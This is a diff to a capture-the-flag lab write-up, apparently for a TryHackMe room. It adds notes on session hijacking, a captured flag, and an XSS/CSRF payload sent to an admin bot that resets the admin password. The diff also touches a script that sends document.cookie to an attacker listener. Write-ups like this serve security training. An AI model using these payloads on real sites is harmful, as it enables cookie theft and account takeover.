@@ -109,7 +109,7 @@ Starting gobuster in directory enumeration mode
 ```JS
 <script>  
 var img = new Image();  
-img.src = ‘http://10.10.235.199:4444/stealcookies?’+ document.cookie;  
+img.src = 'http://10.10.235.199:4444/stealcookies?'+ document.cookie;  
 </script>
 ```
 
@@ -134,8 +134,32 @@ Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
 And by changing ou PHPSESSID and go to `dashboard.php` it's show this :
 ![[Pasted image 20250325204238.png]]
 
+On the port 8081 if we also change the PHPSESSID we can have the first flag :
+![[Pasted image 20250325205110.png]]
 
-On the page `mod.php` we can activate our account.
+```FLAG
+ModP@wnEd
+```
+
+
+On the `chat.php` page we can send an #XSS and it's working. So we send the same payload and we got an PHPSESSID but it's change nothing. But we know one thing, i'ts the admin bot and he probabely open the message one day. So we send the payload of CSRF task7 to the bot :
+
+```JS
+<script>
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', "http" + "://worldwap.thm:8081/change_password.php", true);
+        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                alert("Action executed!");
+            }
+        };
+        xhr.send('action=execute&new_password=1234');
+    </script>
+```
+
+So now we juste need to logout and log as admin with `admin:1234`
 ## 5. **Installation
 
 ## 6. **Command and Control
